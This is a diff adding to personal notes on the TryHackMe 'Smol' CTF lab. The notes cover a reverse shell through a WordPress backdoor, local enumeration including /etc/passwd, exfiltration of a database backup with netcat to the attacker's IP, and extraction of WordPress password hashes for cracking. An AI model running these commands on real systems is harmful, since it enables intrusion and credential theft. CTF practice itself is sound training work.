@@ -687,4 +687,147 @@ curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=rm%20/tmp/f%3
 listening on [any] 1234 ...
 connect to [10.8.136.212] from (UNKNOWN) [10.10.97.230] 51558
 sh: 0: can't access tty; job control turned off
+
+# privilege escalation
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ pwd
+/var/www/wordpress/wp-admin
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="20.04.6 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.6 LTS"
+VERSION_ID="20.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=focal
+UBUNTU_CODENAME=focal
+
+$ ls /
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+swap.img
+sys
+tmp
+usr
+var
 $
+
+$ ls /home
+diego
+gege
+ssm-user
+think
+ubuntu
+xavi
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/usr/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+think:x:1000:1000:,,,:/home/think:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+xavi:x:1001:1001::/home/xavi:/bin/bash
+diego:x:1002:1002::/home/diego:/bin/bash
+gege:x:1003:1003::/home/gege:/bin/bash
+ssm-user:x:1004:1006::/home/ssm-user:/bin/sh
+ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
+
+# root
+
+# think:x:1000:1000:,,,:/home/think:/bin/bash
+
+$ ls /opt/
+wp_backup.sql
+
+cat /opt/wp_backup.sql
+cat /opt/wp_backup.sql | grep think
+
+move to local this file
+
+# me
+
+nc -lvnp 1234 > received.txt
+
+# target
+
+nc 10.8.136.212 1234 < /opt/wp_backup.sql
+
+# home user list
+
+diego
+gege
+ssm-user
+think
+ubuntu
+xavi
+
+cat received.txt | grep think
+cat received.txt | grep diego
+cat received.txt | grep gege
+cat received.txt | grep ssm-user
+cat received.txt | grep ubuntu
+cat received.txt | grep xavi
+
+think','$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/','think','josemlwdf@smol.thm','http://smol.thm','2023-08-16 15:01:02','',0,'Jose Mario Llado Marti'),(4,'gege','$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege'),(5,'diego','$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1','diego','diego@smol.thm','http://smol.thm','2023-08-17 20:19:15','',0,'diego'),(6,'xavi','$P$BvcalhsCfVILp2SgttADny40mqJZCN/','xavi','xavi@smol.thm','http://smol.thm','2023-08-17 20:20:01','',0,'xavi');
+
+# cracking -> .txt 로 하니까 인코딩 문제 발생 -> .hash 로 반드시 저장하기!
+
+echo '$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/' > think.hash
+echo '$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1' > gege.hash
+echo '$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1' > diego.hash
+echo '$P$BvcalhsCfVILp2SgttADny40mqJZCN/' > xavi.hash
